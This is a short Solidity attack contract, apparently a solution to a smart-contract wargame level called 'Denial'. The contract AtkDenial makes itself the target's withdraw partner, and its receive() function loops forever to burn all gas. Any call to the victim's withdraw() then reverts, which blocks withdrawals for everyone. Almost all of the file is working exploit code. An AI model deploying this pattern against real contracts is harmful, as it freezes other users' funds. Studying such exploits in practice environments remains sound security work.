// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial  {
	function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}


contract AtkDenial  {


    function callSetWithdrawPartner(address _target) external {
        Denial(_target).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true)
        {

        }
    }

}